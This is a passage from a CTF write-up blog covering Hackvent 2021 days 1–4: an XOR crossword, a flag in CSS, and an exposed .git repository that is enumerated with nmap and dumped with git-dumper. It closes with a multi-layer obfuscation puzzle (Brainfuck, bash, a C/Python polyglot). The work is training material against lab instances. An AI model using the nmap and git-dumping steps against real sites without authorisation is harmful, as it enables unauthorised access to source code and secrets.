# Hackvent 2021

[ctf](/tags#ctf ) [hackvent](/tags#hackvent ) [python](/tags#python )
[git](/tags#git ) [gitdumper](/tags#gitdumper )
[obfuscation](/tags#obfuscation ) [brainfuck](/tags#brainfuck )
[polyglot](/tags#polyglot ) [jsfuck](/tags#jsfuck ) [de4js](/tags#de4js )
[python-pil](/tags#python-pil ) [reverse-engineering](/tags#reverse-
engineering ) [pcap](/tags#pcap ) [wireshark](/tags#wireshark )
[nmap](/tags#nmap ) [content-length](/tags#content-length ) [ignore-content-
length](/tags#ignore-content-length ) [cistercian-numerals](/tags#cistercian-
numerals ) [code-golf](/tags#code-golf ) [type-juggling](/tags#type-juggling )
[ghidra](/tags#ghidra ) [clara-io](/tags#clara-io ) [stl](/tags#stl )
[youtube](/tags#youtube ) [kotlin](/tags#kotlin ) [race-condition](/tags#race-
condition ) [p-384](/tags#p-384 ) [eliptic-curve](/tags#eliptic-curve )
[signing](/tags#signing ) [crypto](/tags#crypto )  
  
Jan 1, 2022

Hackvent 2021

![](https://0xdfimages.gitlab.io/img/hv21-cover.png)

This year I was only able to complete 14 of the 24 days of challenges, but it
was still a good time. I learned something about how web clients handle
content lengths, how to obfuscate JavaScript for a golf competition, and
exploited some neat crypto to sign commands for a server.

## HV21.01

### Challenge

![hv21-ball01](https://0xdfimages.gitlab.io/img/hv21-ball01.png) | HV21.01 X-w0Rd Puzzle  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![crypto](../img/hv-cat-crypto.png)CRYPTO  
Level: | novice  
Author: |  charon   
  
> It seems the elves have sent us a message via a newspaper crossword puzzle.
> Can you solve it to find out what they want to tell us?
>
> Instructions
>
>   * Fill in the puzzle in all capital letters
>   * The initial letters of each word are the solution - in order the same
> order the questions are asked:
>     * horizontal words: top to bottom
>     * vertical words: left to right
>

>
> Horizontal
>
>   1. A diagram of arrows not allowing cycles
>   2. A handbag for carrying around money
>   3. Very, very secure
>   4. Golf: number of strokes required
>   5. Congo between 1971 and 1997
>   6. State of appearing everywhere
>   7. Tuples in everyday language
>   8. Makes you laugh or silences you
>

>
> Vertical
>
>   1. Plea by many doctors right now
>   2. Put in parcels
>   3. Lets you change user
>   4. …-test
>   5. How you should transmit your data
>   6. Need to squash them - fix your code!
>   7. Attributed to a marquis - no pain, no gain.
>   8. Doing something in a way that causes fatigue is doing it…
>   9. A drink you may need after finishing this puzzle.
>

>
> Hints
>
>   * the words are in order (ltr & ttb): first hint is for the top left
> horizontal word
>   * number means number of chars in word
>   * check the title - do you need all the letters?
>   * we know how to hide gridlines
>   * what seems redundant really isn’t - it’s the key you seek
>

![image-20211202204648069](https://0xdfimages.gitlab.io/img/image-20211202204648069.png)

### Solution

#### Matching Clues to spaces

This challenge is mostly about reading all the instructions and the hints.

There are little numbers in each starting box, but they aren’t unique.
Typically those numbers would match the space to a clue, but instead they tell
how many letters are in the answer.

Paying close attention then also shows that the 8-letter vertical in the
middle of the puzzle doesn’t intersect with the 5-letter horizontal at the
bottom in the middle.

When I first started, I assumed this all meant if I found a three letter word,
it could go into any of the three letter spaces. But that’s not true. The
instructions do say how clues pair to spaces:

>   * The initial letters of each word are the solution - in order the same
> order the questions are asked:
>     * horizontal words: top to bottom
>     * vertical words: left to right
>

So I can label the starting blocks in red:

![image-20211202205643812](https://0xdfimages.gitlab.io/img/image-20211202205643812.png)

#### Clues ==> Words

I was able to solve most of the clues, and the rest came once I got the flag:

Horizontal:

  1. A diagram of arrows not allowing cycles ==> DAG, short for [directed acyclic graph](https://en.wikipedia.org/wiki/Directed_acyclic_graph)
  2. A handbag for carrying around money ==> PURSE
  3. Very, very secure ==> ULTRASECURE
  4. Golf: number of strokes required ==> PAR
  5. Congo between 1971 and 1997 ==> ZAIRE
  6. State of appearing everywhere ==> UBIQUITY
  7. Tuples in everyday language ==> PAIRS (though I argue this should be lists, as, at least in Python Tuples can be anywhere from 1 to n items)
  8. Makes you laugh or silences you ==> GAG

Vertical

  1. Plea by many doctors right now ==> VACCINATE
  2. Put in parcels ==> PRESENTS
  3. Lets you change user ==> SU
  4. …-test ==> PEN
  5. How you should transmit your data ==> SECURELY
  6. Need to squash them - fix your code! ==> BUGS
  7. Attributed to a marquis - no pain, no gain. ==> SADIST
  8. Doing something in a way that causes fatigue is doing it… ==> WEARINGLY
  9. A drink you may need after finishing this puzzle. ==> GIN

![image-20211203100639793](https://0xdfimages.gitlab.io/img/image-20211203100639793.png)

#### XOR

With the clues all (or mostly) solved, the result looks like:

![image-20211203101026689](https://0xdfimages.gitlab.io/img/image-20211203101026689.png)

Entering this as the flag does not solve. I spent a lot of time thinking I had
wrong letters (and in fact, I did on initial attempts).

Eventually, it’s time to consider both the ⊻ symbol and the name of the
challenge, “X-w0Rd Puzzle”. There’s not a lot of obvious things to XOR with.
Some ideas:

  * Single byte XOR across all of them.
  * XOR each with the number in the starting box (the length) as a number.
  * XOR each with the number in the starting box (the length) as a character.

It was the last one that worked.

    
    
    >>> letters = "DPUPZUPGVPSPSBSWG"
    >>> numbers = "35935853982384693"
    >>> ''.join([chr(ord(l)^ord(n)) for l,n in zip(letters, numbers)])
    'welcometohackvent'
    

**Flag:`HV{welcometohackvent}`**

## HV21.02

### Challenge

![hv21-ball02](https://0xdfimages.gitlab.io/img/hv21-ball02.png) | HV21.02 No source, No luck!  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![web_security](../img/hv-cat-web_security.png)WEB_SECURITY  
Level: | easy  
Author: |  explo1t   
  
> Now they’re just trolling you, aren’t they? They said there would be a flag,
> but now they’re not even talking to us for real, just shoving us along 😤 No
> manners, they got!

There’s also a button to spin up an individual copy of a website. Visiting the
URL in a browser just redirects to a [YouTube
RickRoll](https://www.youtube.com/watch?v=dQw4w9WgXcQ).

### Solution

I’ll use `curl` to see what’s going on, using `-I` to get just the headers
with a HEAD request. First, trying to visit the site on HTTP (which is what
`curl` assumes by default if no protocol is given) results in a redirect to
the same site on HTTPS:

    
    
    $ curl -I b43fa174-0d5d-4f43-ba83-2418fdffc687.idocker.vuln.land
    HTTP/1.1 307 Temporary Redirect
    Location: https://b43fa174-0d5d-4f43-ba83-2418fdffc687.idocker.vuln.land:443/
    Date: Fri, 03 Dec 2021 15:34:05 GMT
    Content-Length: 18
    Content-Type: text/plain; charset=utf-8
    

Visiting on HTTPS returns another redirect, this time to YouTube:

    
    
    $ curl -I https://b43fa174-0d5d-4f43-ba83-2418fdffc687.idocker.vuln.land
    HTTP/2 200 
    content-type: text/html; charset=utf-8
    date: Fri, 03 Dec 2021 15:35:47 GMT
    link: <style.css>; rel=stylesheet;
    refresh: 5; url=https://www.youtube.com/watch?v=dQw4w9WgXcQ
    server: Werkzeug/2.0.2 Python/3.10.0
    content-length: 0
    

There is a link header which points to a stylesheet at `style.css`. A request
for that returns some CSS, which has a flag in it:

    
    
    $ curl https://b43fa174-0d5d-4f43-ba83-2418fdffc687.idocker.vuln.land/style.css
    html {
      display: flex;
      height:100vh;
      overflow: hidden;
      justify-content: center;
      align-items: center;
      flex-direction:column;
      background: #222;
    }
    
    body::before, body::after {
      font-weight: bold;
      font-family: 'SF Mono', 'Courier New', Courier, monospace;
      font-size: 42px;
      color: #ff4473;
    }
    
    head { 
      display: block;
      background-image: url(https://media.giphy.com/media/Ju7l5y9osyymQ/giphy.gif);
      height:20rem;
      width:20rem;
      background-repeat: no-repeat;
      background-size: cover;
      border: 5px solid #fff;
      border-radius: 10px;
      border-style: dashed;
    }
    
    body::before {
      display: inline-block;
      padding-top: 3rem;
      content: "Never gonna give you up...";
    }
    
    body::after {
      margin-left: 16px;
      display: inline;
      content: "HV21{h1dd3n_1n_css}";
    ...[snip]...
    

**Flag:`HV21{h1dd3n_1n_css}`**

## HV21.03

### Challenge

![hv21-ball03](https://0xdfimages.gitlab.io/img/hv21-ball03.png) | HV21.03 Too Much GlItTer!  
---|---  
Categories: |  ![web_security](../img/hv-cat-web_security.png)WEB_SECURITY   
Level: | easy  
Author: |  HaCk0   
  
> To celebrate Christmas even more the elves have setup a small website to
> help promote christmas on the internet. It is currently under heavy
> development but they wanted to show it off anyhow.
>
> Unfortunately they made a pretty silly error which threatens the future of
> their project.
>
> Can you help them find the vulnerability and retrieve the flag?

The challenge has a personalized instance of a site I can start, and this time
it’s actually got a page:

![image-20211203104453794](https://0xdfimages.gitlab.io/img/image-20211203104453794.png)

### Solution

#### Enumeration

The title of the challenge made it very clear what the next step was, but
without noticing that, `nmap` with default scripts would also show it:

    
    
    $ nmap -p 443 -sCV 690cfdde-fdd5-44c5-b632-725d4a8d790e.idocker.vuln.land
    Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-03 10:45 EST
    Nmap scan report for 690cfdde-fdd5-44c5-b632-725d4a8d790e.idocker.vuln.land (152.96.7.3)
    Host is up (0.10s latency).
    
    PORT    STATE SERVICE  VERSION
    443/tcp open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    | http-git: 
    |   152.96.7.3:443/.git/
    |     Git repository found!
    |     Repository description: Unnamed repository; edit this file 'description' to name the...
    |_    Last commit message: Adds flag placeholder 
    |_http-server-header: nginx/1.21.4
    |_http-title: Merry Xmas | Home
    | ssl-cert: Subject: commonName=*.idocker.vuln.land
    | Subject Alternative Name: DNS:*.idocker.vuln.land, DNS:idocker.vuln.land
    | Not valid before: 2021-09-06T00:00:00
    |_Not valid after:  2022-09-06T23:59:59
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 19.12 seconds
    

There’s a Git repo hosted on the site.

#### Get Git

The Git repo will likely have not only copies of the current site, but history
and other additional work as well. There’s a few ways to get this data. A tool
like [git-dumper](https://github.com/arthaud/git-dumper) will do it for me. It
will get the known files in the `.git` folder and use them to reconstruct what
other files to pull.

    
    
    $ git-dumper https://abac9fc9-63f2-4049-9354-2d85ef655077.idocker.vuln.land .
    [-] Testing https://abac9fc9-63f2-4049-9354-2d85ef655077.idocker.vuln.land/.git/HEAD [200]
    [-] Testing https://abac9fc9-63f2-4049-9354-2d85ef655077.idocker.vuln.land/.git/ [200]
    [-] Fetching .git recursively
    [-] Fetching https://abac9fc9-63f2-4049-9354-2d85ef655077.idocker.vuln.land/.gitignore [404]
    [-] https://abac9fc9-63f2-4049-9354-2d85ef655077.idocker.vuln.land/.gitignore responded with status code 404
    [-] Fetching https://abac9fc9-63f2-4049-9354-2d85ef655077.idocker.vuln.land/.git/ [200]
    [-] Fetching https://abac9fc9-63f2-4049-9354-2d85ef655077.idocker.vuln.land/.git/index [200]
    ...[snip]...
    [-] Running git checkout .
    Updated 57 paths from the index
    

That last step, running `checkout` will restore the most recent files:

    
    
    $ ls
    about.html  contacts.html  css  flag.html  images  index.html  js  links.html  sitemap.html
    

#### Enumerate Git

There’s a few things to look at now that I have the source for the site. The
current pages all seem pretty much what I saw. There’s not a flag hidden in
and PHP executed server side or anything like that. I can also look for
vulnerabilities that I might exploit to get access to the filesystem or even
execution, but nothing jumps out here.

`git status` shows I’m on the master branch, and that the files are the same
as the most recent commit:

    
    
    $ git status 
    On branch master
    nothing to commit, working tree clean
    

`git log` will show a history of commits:

    
    
    $ git log
    commit 0bd2f175eb525057f6f306d7b420e24807beb9f2 (HEAD -> master)
    Author: Mathias Scherer <scherer.mat@gmail.com>
    Date:   Wed Dec 1 16:29:24 2021 +0100
    
        Adds flag placeholder
    
    commit 9189c31b7f1c3f2e40133851ba3b6c39ffb704bd
    Author: Mathias Scherer <scherer.mat@gmail.com>
    Date:   Wed Dec 1 16:27:07 2021 +0100
    
        Initial commit
    

To see what’s different, I’ll run `git diff`:

    
    
    $ git diff --name-only 9189c31b7f1c3f2e40133851ba3b6c39ffb704bd
    flag.html
    

The only thing that’s changed it `flag.html`. `git diff` without the `--name-
only` flag will show the full difference in the file:

    
    
    $ git diff 9189c31b7f1c3f2e40133851ba3b6c39ffb704bd
    diff --git a/flag.html b/flag.html
    new file mode 100644
    index 0000000..633a7df
    --- /dev/null
    +++ b/flag.html
    @@ -0,0 +1,90 @@
    +<!DOCTYPE html>
    +<html lang="en">
    +<head>
    +<title>Merry Xmas | Contacts</title>
    +<meta charset="utf-8">
    ...[snip]...
    

At the top, it’s clear that it’s comparing `flag.html` to `/dev/null`, which
means this file didn’t exist in the previous commit. So no flag there.

`git branch` will show the branches in the repo:

    
    
    oxdf@parrot$ git branch
      feature/flag
    * master
    

Branches are used when a developer wants to make some specific changes, and
then merged back into the main branch once they are complete. This workflow
allows for different developers to work on different parts of the repo at the
same time. So seeing `feature/flag` as a branch is definitely interesting,
likely an unreleased page. I’ll check out that branch:

    
    
    oxdf@parrot$ git checkout feature/flag 
    Switched to branch 'feature/flag'
    

I can look at the source for `flag.html`, but I can also visualize it by
running `firefox flag.html`:

![image-20211203122517431](https://0xdfimages.gitlab.io/img/image-20211203122517431.png)

**Flag:`HV{n3V3r_Sh0w_Y0uR_.git}`**

## HV21.04

### Challenge

![hv21-ball04](https://0xdfimages.gitlab.io/img/hv21-ball04.png) | HV21.04 Christmas in Babylon  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![programming](../img/hv-cat-programming.png)PROGRAMMING  
Level: | easy  
Author: |  2d3   
  
> Something weird happened to the elves, suddenly when one says something,
> there’s a number of the others required to translate what they mean. It only
> becomes clear in the end.
>
> Can you help Santa understand what they’re saying?

There’s a link to [this
file](/files/03960b75-2139-47ca-9b99-0cf6b4ec6c60.zip).

### Solution

#### C#

The code looks like this:

    
    
    using System;using System.Text;using static System.Console;void Rev(string s){var chars=Encoding.
    ASCII.GetString(Convert.FromBase64String(s)).ToCharArray();Array.Reverse(chars);WriteLine(new string
    (chars));}
    Rev("KzgrKitoKysrKysreysrKysraSsvPiswK3krKz4oKysrKysrICsrPlQrKysrKysrKyt9KysrPlsrVCsrK3grKysr");
    ...[snip]...
    Rev("Kz4ueisrPi4+Ri42Kys+Lis+LisrK3QrPm4uKyt7Pi4+LisrPi4rK3QrKz4pLnY+NS4rUCtTK2YrMD5TLj4uK0wr");
    Rev("XTxdLVtbay4gK2MrPi4rKz4jLisrPi4rKyt8");
    

Without knowing the code is C#, it’s pretty clear that the `Rev` function
takes a string, base64-decodes it, reverses it, and then prints it.

I solved it using `bash` commands to get the base64 strings and decode:

    
    
    oxdf@parrot$ cat code.txt | grep "^Rev" | cut -d'"' -f2 | while read line; do echo $line | base64 -d | rev; done > code.bf
    

This will get the lines that call `Rev()`, get just the text in the `""`, and
then for each line decode it, reverse it, and print it.

#### brainfuck

The output is a jumbled mess:

    
    
    |+++.>++.#>++.>+c+ .k[[-]<]+L+.>.S>0+f+S+P+.5>v.)>++t++.>++.>.>{++.n>+t+++.>+.>++6.F>.>++z.>+{.k>---.>++++.>.w>---. >o---.>.>++.G>+7++.>d-.>--n.{>--.>i-.P>-E.>-H-.>---.>.|>+ +K.>--.>+++.>++ +a+.4>.>---.F>++x.>.f>+J+++.>|.>+++i<<<<H<-]>+++.d>Q-.>++++.>T---.>.>++r+D+.8>.4>-.>++ .>-T-}-.>.>.>-8+<<I<<<<<t<*<<<W<<< < <<<<<1<<<<<p<<P<8<<<<<<x<<<D<<X<<<<<<<<<<<<+++>++1++F+++++++4+x> ++++>S++X++>++++>++++>+p+++++++++k++>+K+++}>+++++++++> ++++ >)++++++U++++++++2>)+++0++q+++++++++|>++++>++&++>++++>+p++*++++ ++ +++>++++++>+h++++2+>g++++P+d+>G++++>+m+++>++++z++++++y>++++>++f++++Y>U+++++++Q++>++++>+3+Q+ +>+++0++ +++++++++>+++2+++++R+++++d+>++(++>+8+++J++++K++ ++++}>+++r+g+++++++++N>+++*++++++++|++M+++M++G++ ++>L+++G+++ ++>C+k++++++#+r++++>+++5+>+++Q+> ++++>O++++++>++++x+A++++*>++++>++++>+J++++X++++3+++&>++P+r+++x+++++ >+M++++I+++>++++++++++++++>++&+++++I+++)+|++>++++++7+d+++++4++>++S+++++++++> ++++i++++++++L+>+++K+>/+0+++++ +++@++++Z+u+)>+m+++>++++++.>++.[[-]<h]7+x+++++++@[>++++N+++@++S+++J>++Z++ +9+++++++++>++++ +>++M.>++.>++.[[-K]<]M+++++++W+[>+*+++G+++++++++L+|+c+>+K<<-]> -h--{<<<<<<<<<<< <t<<-]>.>(.>---.>+L+ +.U>9.>-.>@.C>++.>.y>+++.>--.>+.>3++/+w+++++>+++++>++x++ +++m+++}+++++K+>+Z++++>m+++b+++i>++++>+}<+Y++++b+++9++r> ++U+++++++p++++>+m+c+++u+ +++a+Y+a+h++3>++++>+S+++>+G+.>3+4+.F[[-8]8<b]+++++X+++[>+++8+>+++z+>+{+++++++y++a+#++ >+T+-.>--. >--.7>+.>6.>.>.>f+.9>++++.>{--.>+++.>--8.>+.>--.>++++.>g++.<H<<<0<8<<<k<<s<<I<o-]>.>.>-9--. >+++.>q.>-. >e.O>++.>-w-.P>-Q-.>-++++++++j+++>+++Q++>+r+p+++X+t+C++E++K+++>4+++X+>+k<<<<<<<<<<<<<<<@+v+++++++++>+t++++++++++B+++>H++++o++++ +++++b+++3>+w++6++>+++3++H++++e++>++++5+++++x>W++++++G++++g++ +++>+q+++E++t+8+++++>+q+5++++++F>+&++6++++x+K+M+W++++p+ +>++++@+++v++++++++>++ +C+++>++++B+++++++>+++++|++++&+w+++++2+>+b++H++}+++d++Q+r+s+++V+>Q+++U+++++++++++e++s+ ++ +++>I+++++z++++3+C+++>++++{+++++++t+++>r++w++>+ +e++>k+Z+++.2>++.[[-V]<]m+++++B+++ [ >+I++5+>+7+(++>++/++++++e+c++v++>+o+6+++.>C++++.>J++F+.>+&.>+.>++++.>.t>--.9> +h+0++.>--p-.P>F- -.>--.d>+.>6---.>+++.B>A.>-.>.W>++.>}-.>9+B.>0++++r.Q>.>--C.a>++&+.>2---.o>++h>++U++(++++>q+U+++>#+m<<U<<<<<|<<<<<<<<<<<<3<<Q<<<<<<<Q<-]>.Q>d{+++++H+>+++3++&++L++++++a+)++/>+++++w>++++j+++++H>+++++2+++++++++M++O+>+++++R++++>+++++j++++Z++|+d>&+W++++z++)++&++G+>F++{+Y+++s+++#++>+9+++1+e++++++E+s++++>+W+++f++++ +*+++ >+++++++H++{++k+>++++++++>+k+++++++k+9+++v>+N++++++H+++(+++a++5>++++x+++++++++++h+>+++++++++K++>M+++++++O+++h++T++>C+7+++>+}+I++6>K++++ ++++>++++2+Z++s++4+]<]+++++I++H+[>++++>++a++F>n+++++++++++b++>+++++++z+++++>+3+++++++.>{.>+.>---Q.>.>q.>--.G>---.>+J+g+.m>---.>--l-f.>c---.>++.>++.[ [-- -l-(.>+.>++8+*+o.>--7-.>.>- -E-.>--8-.>+./>++++.>8.>+.>---.>++++.>-U.C>.>++.>++++I.>V+n++.>D+U.>5+.>++C++.>.>Y+.>++)++.>+++.>.> .><p<Y<)<@<<<<s<<v<<Q<<<<<<<<<<<)<<<<<<<<<<f<<<o<<-]>.>.>---.>+++.G>+L++ >+++n+++*+p+++(+>++U+|+++X+++>++++q+++V++7>++++L>...[snip]...
    

This is Brainfuck, a language common in CTFs and nothing else. I missed it as
first, because BF only requires six symbols, `+`, `-`, `<`, `>`, `.`, `,`,
`[`, and `]`. Still, other characters are ignored (from the [wikipedia
page](https://en.wikipedia.org/wiki/Brainfuck)):

> The language consists of eight
> [commands](https://en.wikipedia.org/wiki/Command_\(computing\)), listed
> below. A brainfuck program is a sequence of these commands, possibly
> interspersed with other characters (which are ignored).

I grabbed [this script](https://raw.githubusercontent.com/pocmo/Python-
Brainfuck/master/brainfuck.py) from GitHub, and it created the next layer:

    
    
    oxdf@parrot$ python brainfuck.py code.bf > code.sh
    

#### Bash

The resulting script looks like a Bash script:

    
    
    a="~OdlsoZ}J\`pn1S=P0!uge%w5F3b2L<,t.A VNjaIfByMK^cxm(hz\"i>;4DR7{\$#Tr+HE*WY['9vXQ6)/:U_k]8GCq"
    b=" vnd8Q4a}EVf.,I0eKs\`o76HPyD/_bxLS'T%[1i(UCrl2J>tAW5hGq{=+\$g^Y]pX;#u)OMcB3w9jZ:*!N\"<Rkz~mF"
    code() {
      echo "|+adYMHl0~_uxlae1zc"
      echo "?+adYMHl0~_uxladx1zc"
      echo "&+l0nad0~x0ux"
      echo "@+l0nad0~l}x}~Yedux~Yz}y~#Nj%\$"
      echo "&nyeC~x3#adR~aC#eyx~baYxS~tauxS~*#xaed}M"
      echo "|+l0nad0~HI,E~,~V~jKs~4~'K"
    ...[snip]...
      echo "&~~~~y0xHyd~s~)~,r"
      echo "@+~)2"
    }
    code | grep -E "^[|@]" | sed -E "s/^.//" | tr "$a" "$b"
    

`code()` will print a bunch of stuff, which is then modified and printed. I
can just run this one and get the next file:

    
    
    oxdf@parrot$ bash code.sh > code.py
    

#### Python / C

I immediately recognized this as a C file based on the first few lines, but as
I read more, it started to look like a Python file:

    
    
    #include <stdio.h>
    #define data const char p[17]
    #define u(x) x % 128 + 32
    #define bytearray(x) {u(547),u(139),u(432),u(345),u(596),u(840),u(847),u(718),u(669),u(547),u(345),u(596),u(840),u(847),u(718),u(31),0}
    #define b64decode
    #define discard int _
    #define from int main(void) {
    #define base64
    #define import
    #define hashlib
    #define sys
    from base64 import b64decode
    import hashlib
    import sys
    data = bytearray(b64decode("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"));
    discard = 1 // 3; """
        ;
        printf("%s", p);
        return 0;
    }
    /* """
    pwd = input().encode("utf-8")
    if hashlib.sha256(pwd).hexdigest() != "2cbdd00836863dbf7a24c10c67c3d9b7da272a6e2d0532689aebd2598fb7d53a" :
        sys.exit(1)
    
    for i in range(len(data)) :
        data[i] ^= pwd[i % len(pwd)]
    
    print(bytes(data).decode("utf-8"))
    # */
    

It’s actually a
[polyglot](https://en.wikipedia.org/wiki/Polyglot_\(computing\)), or a file
that’s valid for multiple different languages or formats.

Looking at it as Python, I can ignore the lines that start with `#`, and it is
going to prompt for a password, take a sha256 hash of that password, and
compare it against a hardcoded value. If that works, it will then xor the data
by the password and print it.

The code code

    
    
